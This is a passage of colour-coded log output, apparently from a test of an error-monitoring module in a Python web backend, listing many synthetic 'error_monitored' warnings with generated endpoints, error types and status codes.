WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.923500Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m88[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4378'[0m [36merror_type[0m=[35merror_type_28[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_78[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m578[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.923557Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m88[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4379'[0m [36merror_type[0m=[35merror_type_29[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_79[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m579[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.923608Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m88[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4380'[0m [36merror_type[0m=[35merror_type_30[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_80[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m580[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.923664Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m88[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4381'[0m [36merror_type[0m=[35merror_type_31[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_81[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m581[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.923715Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m88[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4382'[0m [36merror_type[0m=[35merror_type_32[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_82[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m582[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.923766Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m88[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4383'[0m [36merror_type[0m=[35merror_type_33[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_83[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m583[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.923815Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m88[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4384'[0m [36merror_type[0m=[35merror_type_34[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_84[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m584[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.923864Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m88[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4385'[0m [36merror_type[0m=[35merror_type_35[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_85[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m585[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.923965Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m88[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4386'[0m [36merror_type[0m=[35merror_type_36[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_86[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m586[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.924035Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m88[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4387'[0m [36merror_type[0m=[35merror_type_37[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_87[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m587[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.924090Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m88[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4388'[0m [36merror_type[0m=[35merror_type_38[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_88[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m588[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.924141Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m88[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4389'[0m [36merror_type[0m=[35merror_type_39[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_89[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m589[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.924191Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m88[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4390'[0m [36merror_type[0m=[35merror_type_40[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_90[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m590[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.924240Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m88[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4391'[0m [36merror_type[0m=[35merror_type_41[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_91[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m591[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.924290Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m88[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4392'[0m [36merror_type[0m=[35merror_type_42[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_92[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m592[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.924339Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m88[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4393'[0m [36merror_type[0m=[35merror_type_43[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_93[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m593[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.924388Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m88[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4394'[0m [36merror_type[0m=[35merror_type_44[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_94[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m594[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.924438Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m88[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4395'[0m [36merror_type[0m=[35merror_type_45[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_95[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m595[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.924488Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m88[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4396'[0m [36merror_type[0m=[35merror_type_46[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_96[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m596[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.924537Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m88[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4397'[0m [36merror_type[0m=[35merror_type_47[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_97[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m597[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.924587Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m88[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4398'[0m [36merror_type[0m=[35merror_type_48[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_98[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m598[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.924636Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m88[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4399'[0m [36merror_type[0m=[35merror_type_49[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_99[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m599[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.924684Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m89[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4400'[0m [36merror_type[0m=[35merror_type_0[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_0[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m400[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.924731Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m89[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4401'[0m [36merror_type[0m=[35merror_type_1[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_1[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m401[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.924780Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m89[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4402'[0m [36merror_type[0m=[35merror_type_2[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_2[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m402[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.924827Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m89[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4403'[0m [36merror_type[0m=[35merror_type_3[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_3[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m403[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.924876Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m89[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4404'[0m [36merror_type[0m=[35merror_type_4[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_4[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m404[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.924924Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m89[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4405'[0m [36merror_type[0m=[35merror_type_5[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_5[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m405[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.924971Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m89[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4406'[0m [36merror_type[0m=[35merror_type_6[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_6[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m406[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.925018Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m89[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4407'[0m [36merror_type[0m=[35merror_type_7[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_7[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m407[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.925065Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m89[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4408'[0m [36merror_type[0m=[35merror_type_8[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_8[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m408[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.925113Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m89[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4409'[0m [36merror_type[0m=[35merror_type_9[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_9[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m409[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.925160Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m89[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4410'[0m [36merror_type[0m=[35merror_type_10[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_10[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m410[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.925207Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m89[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4411'[0m [36merror_type[0m=[35merror_type_11[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_11[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m411[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.925254Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m89[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4412'[0m [36merror_type[0m=[35merror_type_12[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_12[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m412[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.925300Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m89[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4413'[0m [36merror_type[0m=[35merror_type_13[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_13[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m413[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.925347Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m89[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4414'[0m [36merror_type[0m=[35merror_type_14[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_14[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m414[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.925394Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m89[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4415'[0m [36merror_type[0m=[35merror_type_15[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_15[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m415[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.925445Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m89[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4416'[0m [36merror_type[0m=[35merror_type_16[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_16[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m416[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.925499Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m89[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4417'[0m [36merror_type[0m=[35merror_type_17[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_17[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m417[0m
